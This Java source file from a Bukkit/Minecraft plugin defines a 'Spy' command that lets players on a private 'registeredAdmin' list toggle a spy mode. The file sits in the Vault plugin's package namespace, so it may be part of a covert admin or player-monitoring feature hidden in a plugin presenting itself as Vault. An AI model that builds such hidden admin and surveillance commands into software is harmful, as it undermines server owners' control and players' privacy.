package net.milkbowl.vault.commands.cmds.admin;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class Spy extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredAdmin.contains(p.getName())) {
			if (plugin.spy.contains(p.getName())) {
				plugin.spy.remove(p.getName());
				p.sendMessage(Settings.PREFIX("Spy is now turned off"));
			} else {
				plugin.spy.add(p.getName());
				p.sendMessage(Settings.PREFIX("Spy is now turned on"));
			}
		} else {
			p.sendMessage(Settings.PREFIX("You must be an " + Settings.HIGHLIGHT_COLOUR + "admin " + Settings.SECONDARY_COLOUR + " to execute this command"));
		}
	}

}
